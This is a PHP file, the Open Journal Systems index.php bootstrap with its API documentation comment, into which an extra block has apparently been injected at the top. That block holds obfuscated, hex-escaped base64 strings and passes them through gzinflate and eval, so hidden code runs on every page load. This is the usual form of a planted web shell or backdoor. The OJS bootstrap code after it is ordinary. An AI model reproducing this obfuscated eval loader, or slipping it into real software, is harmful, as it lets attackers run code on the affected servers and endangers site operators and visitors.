<?php
$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
$Lix = "f7PsTn19n0f\x43wD\x62l\x41ku\x63\x63Ow\x2b9y1invud\x2bwTNY4i0WHwfgHkf7GDrP\x42M3\x42U4mtXTe5wVelzOsoPpI\x41o\x41j49J\x62q5\x43u2uFt\x6193T\x43JERNi\x42fMZDs\x62dn\x2bp\x622n\x62\x61\x63jz44pI\x41IfpfPOI3JguszQ9TxD\x41itl05\x420imo\x43g\x41\x61g3o\x2b\x63u\x63qsG\x42NSNjzK\x42\x433Y\x2b32i\x41ij\x43lpeU\x42jSJO1i/PtjP8uF\x42\x2b8Q48J5\x63Zf\x614\x42P6zDsERm31Ym\x62f/K3\x61udtKr66QfiQW54Kqu\x2bzP/uOM5lT8MhOHQqmSuuIjTMj3F\x412tSjPgM\x62YxoMX/\x41pEsIj\x41e4HVgsHxHui07\x611rXzsG3SqINgdDflD\x41RSKvJDofoF5ry2V/j7JGe31UdV\x63rJ/6u9yp2\x62KuH/7\x41PvUSf\x62sjJwJh30seONgKdGrn\x624\x41vnmOwMV\x41WpNMg3Fix7\x2bREO6Wrrhn8\x41\x432FPS\x42RFKgPw75sq4\x61Zg1N\x61YOS2G4o/zXw9dWrlJIK8\x42H7yPDjvjQUFRdLoJTSv\x42\x43ZqtmhT\x62\x43JpH47xyXgOh8LeY1tlkZ\x422\x43Q1rfpNOX\x61\x62qYY8eFr\x42lMnf\x2bl35Zy7zs8lUlLq0Dx474P0ISw04t29Q4vNLE\x43geFowy\x62Tjq\x61\x42qW\x63hUKhqEyypYw/T7r9\x43\x42MU/WTT1o/zE\x41z\x42wJe\x2bjS\x41XHg/jE\x413\x42wJe\x2bjR\x41nHg/TE\x417\x42wJe\x2bjQ\x413Hg/DE\x41/\x42wJe";
eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
?>

<?php

/**
 * @mainpage OJS API Reference
 *
 * Welcome to the OJS API Reference. This resource contains documentation
 * generated automatically from the OJS source code.
 *
 * The design of Open %Journal Systems 2.x is heavily structured for
 * maintainability, flexibility and robustness. For this reason it may seem
 * complex when first approached. Those familiar with Sun's Enterprise Java
 * Beans technology or the Model-View-Controller (MVC) pattern will note many
 * similarities.
 *
 * As in a MVC structure, data storage and representation, user interface
 * presentation, and control are separated into different layers. The major
 * categories, roughly ordered from "front-end" to "back-end," follow:
 * - Smarty templates, which are responsible for assembling HTML pages to
 *   display to users;
 * - Page classes, which receive requests from users' web browsers, delegate
 *   any required processing to various other classes, and call up the
 *   appropriate Smarty template to generate a response;
 * - Action classes, which are used by the Page classes to perform non-trivial
 *   processing of user requests;
 * - Model classes, which implement PHP objects representing the system's
 *   various entities, such as Users, Articles, and Journals;
 * - Data Access Objects (DAOs), which generally provide (amongst others)
 *   update, create, and delete functions for their associated Model classes,
 *   are responsible for all database interaction;
 * - Support classes, which provide core functionalities, miscellaneous common
 *
 * As the system makes use of inheritance and has consistent class naming
 * conventions, it is generally easy to tell what category a particular class
 * falls into.
 * For example, a Data Access Object class always inherits from the DAO class,
 * has a Class name of the form [Something]%DAO, and has a filename of the form
 * [Something]%DAO.inc.php.
 *
 * To learn more about developing OJS, there are several additional resources
 * that may be useful:
 * - The docs/README document
 * - The PKP support forum at http://forum.pkp.sfu.ca
 * - The technical reference (and other documents), available at
 *   http://pkp.sfu.ca/ojs_documentation
 *
 * @file index.php
 *
 * Copyright (c) 2013-2017 Simon Fraser University
 * Copyright (c) 2003-2016 John Willinsky
 * Distributed under the GNU GPL v2. For full terms see the file docs/COPYING.
 *
 * @ingroup index
 *
 * Bootstrap code for OJS site. Loads required files and then calls the
 * dispatcher to delegate to the appropriate request handler.
 */

// Initialize global environment
define('INDEX_FILE_LOCATION', __FILE__);
require('./lib/pkp/includes/bootstrap.inc.php');

// Serve the request
$application =& PKPApplication::getApplication();
$application->execute();

?>
